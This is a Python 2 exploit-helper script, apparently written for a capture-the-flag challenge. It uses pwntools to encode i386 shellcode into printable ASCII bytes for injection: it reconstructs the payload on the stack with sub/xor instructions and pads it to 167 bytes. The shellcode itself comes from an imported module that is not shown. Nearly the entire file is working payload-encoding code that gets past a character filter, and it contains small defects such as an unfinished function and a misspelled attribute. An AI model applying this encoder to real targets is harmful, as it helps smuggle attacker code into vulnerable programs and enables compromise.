#!/usr/bin/env python

import sys

import pwn
import shellcode

LEN = 167


def is_ascii(c):
    # 0010 0001 - 0111 1110
    return 0x21 <= c and c <= 0x7e


def pair32(n):  # (base, x1, x2)
    base = 0
    if n >= 0x80000000:
        base = 0xff


# c = (0xCC - a) ^ b
def pair(c):
    for a in range(0x21, 0x7e):
        b = (0xCC - a) ^ c
        if is_ascii(b):
            return (a, b)
    sys.stderror.write('pair 0x%x\n' % c)
    exit(1)


def seteax(v):
    code = '''
        push esi
        pop eax
    '''
    step = 4

    a = 0
    b = 0
    for i in range(4):
        pos = i * 8
        c = (v >> pos) & 0xff
        p = pair(c)
        a += p[0] << pos
        b += p[1] << pos

    code += '''
        sub eax, 0x%x
        xor eax, 0x%x
    ''' % (a, b)
    return code


def encode(sh):
    sys.stderr.write('encoding len(sh) = %d\n' % len(sh))
    step = 4
    while len(sh) % step != 0:
        sh += '\x00'

    vs = []  # len = 6
    for i in reversed(range(0, len(sh), step)):
        v = 0
        for j in reversed(range(step)):
            v *= 0x100
            v += ord(sh[i + j])
        vs.append(v)

    code = ''
    code += '''
        push esi
        pop eax
        push esi
        pop ebx
        sub eax, 0x33333334
        push eax
        pop esi
    '''
    # esi = 0xCCCCCCCC, ebx = 0

    code += seteax(0x80000800)
    code += '''
        push eax
        pop esp
    '''

    for v in vs:
        code += seteax(v)
        code += 'push eax\n'

    code += seteax(0x80000900)  # so 00 00 doesn't segfault

    # clear stack
    code += 'push ebx\n'

    a = pwn.asm(code, arch='i386')
    if len(a) > LEN:
        sys.stderr.write('asm too long\n')
        exit(1)
    while len(a) < LEN:
        a += 'A'  # inc ecx

    for c in list(a):
        if not is_ascii(ord(c)):
            sys.stderr.write('Internal error: contains 0x%x!\n' % ord(c))
            exit(1)
    a += chr(0x90)  # nop

    return a


def gen():
    sh = pwn.asm(shellcode.shellcode(), arch='i386')
    return encode(sh)


def gen_hello():
    sh = pwn.asm(shellcode.hello(), arch='i386')
    return encode(sh)


def main():
    if '--hello' in sys.argv:
        a = gen_hello()
    else:
        a = gen()
    sys.stdout.write(a)
    sys.stdout.flush()


if __name__ == "__main__":
    main()
